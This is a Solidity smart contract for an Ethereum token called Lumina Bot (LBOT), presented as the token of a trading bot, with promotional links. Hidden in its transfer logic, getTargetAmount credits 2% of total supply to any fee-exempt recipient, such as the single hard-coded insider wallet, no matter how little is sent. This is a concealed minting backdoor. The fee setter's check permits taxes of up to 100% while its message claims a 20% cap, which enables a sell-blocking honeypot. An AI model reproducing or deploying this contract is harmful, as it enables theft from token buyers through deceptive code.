// SPDX-License-Identifier: MIT

/*
Lumina, a #TradingBot for $ETH, boasts features such as limit orders, built-in MEV protection, and an integrated referral program, with exciting updates on the horizon.

Website: https://luminabot.org
Twiter: https://twitter.com/LuminaLabsERC
Telegram: https://t.me/LuminaLabsERC
Bot: https://t.me/luminalabs_bot
*/

pragma solidity 0.8.21;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    event OwnershipTransferred(address owner);
}
interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract LBOT is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"Lumina Bot";
    string private constant _symbol = unicode"LBOT";
    uint8 private constant _decimals = 9;
    uint256 private _supply = 1000000000 * (10 ** _decimals);
    IRouter router;
    address public pair;
    bool private tradingEnabled = false;
    bool private swapEnabled = true;
    uint256 private taxxedTime;
    bool private swapping;
    uint256 taxSwapAt;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExemptFee;
    uint256 private mxTaxSwap = ( _supply * 1000 ) / 100000;
    uint256 private mnTaxSwap = ( _supply * 10 ) / 100000;
    modifier lockSwap {swapping = true; _; swapping = false;}
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 0;
    uint256 private developmentFee = 100;
    uint256 private burnFee = 0;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal devAd = 0x52A3E9a484109a8856F618C9C20278156eF34D79; 
    address internal mktAd = 0x52A3E9a484109a8856F618C9C20278156eF34D79;
    address internal lpAdd = 0x52A3E9a484109a8856F618C9C20278156eF34D79;
    uint256 private buyFee = 1400;
    uint256 private sellFee = 2500;
    uint256 private transferFee = 1400;
    uint256 public mxTxSz = ( _supply * 200 ) / 10000;
    uint256 public mxSell = ( _supply * 200 ) / 10000;
    uint256 public mxWallet = ( _supply * 200 ) / 10000;
    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        isExemptFee[lpAdd] = true;
        isExemptFee[mktAd] = true;
        isExemptFee[devAd] = true;
        isExemptFee[msg.sender] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function getTargetAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExemptFee[recipient]) {return mxTxSz;}
        if(getFeesOnTx(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getFeesOnTx(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0) && getFeesOnTx(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function startTrading() external onlyOwner {tradingEnabled = true;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function checkSwapping(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= mnTaxSwap;
        bool aboveThreshold = balanceOf(address(this)) >= mxTaxSwap;
        return !swapping && swapEnabled && tradingEnabled && aboveMin && !isExemptFee[sender] && recipient == pair && taxxedTime >= taxSwapAt && aboveThreshold;
    }
    function getFeesOnTx(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return buyFee;}
        return transferFee;
    }
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function swapTokensAndSendFee(uint256 tokens) private lockSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(mktAd).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devAd).transfer(contractBalance);}
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpAdd,
            block.timestamp);
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
    receive() external payable {}
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExemptFee[sender] && !isExemptFee[recipient]){require(tradingEnabled, "tradingEnabled");}
        if(!isExemptFee[sender] && !isExemptFee[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= mxWallet, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= mxSell || isExemptFee[sender] || isExemptFee[recipient], "TX Limit Exceeded");}
        require(amount <= mxTxSz || isExemptFee[sender] || isExemptFee[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isExemptFee[sender]){taxxedTime += uint256(1);}
        if(checkSwapping(sender, recipient, amount)){swapTokensAndSendFee(mxTaxSwap); taxxedTime = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExemptFee[sender] ? getTargetAmount(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        mxTxSz = newTx; mxSell = newTransfer; mxWallet = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
}